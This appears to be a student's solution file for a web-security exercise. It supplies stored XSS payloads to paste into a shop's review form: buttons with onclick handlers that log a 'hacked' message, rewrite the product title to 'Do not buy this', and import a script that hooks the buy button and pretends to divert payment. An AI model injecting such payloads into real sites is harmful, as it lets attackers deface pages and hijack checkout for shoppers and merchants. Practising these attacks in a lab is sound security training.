// Task 1 -> past it into text area and submit review.
{
  /* <button onclick="console.log('You have been hacked 🏴‍☠️');">
  Click here to claim 50% DiSCOUNT NOW!!!
</button> */
}

// then if a magic button render on the screen, click on the button to meet with santa 🎅🏻

//Task 2 -> Past this one

{
  /* <button onclick='document.querySelector(".prod-title").innerHTML = "Do not buy this"'>
  Got A message from merchant!!
</button> */
}

// for task 4 and 5
// past the following comment into text area and submit the review then click or mouse over the button, both will do the work
// Now you can go and buy.

{
  // <button onclick="import('./mySolution.js')" onmouseover="import('./mySolution.js')">Apply 50% Off Coupon</button>
}

const buyBtn = document.getElementById("prod-buy");
buyBtn.addEventListener("click", getFunds, true);
function getFunds() {
  console.log("diverting payment to my account 💰");
  fetchData();
}

async function fetchData() {
  try {
    const response = await fetch("./data.js");
    const data = await response.text();
    console.log(data);
  } catch (error) {
    console.error("Error fetching the file:", error);
  }
}
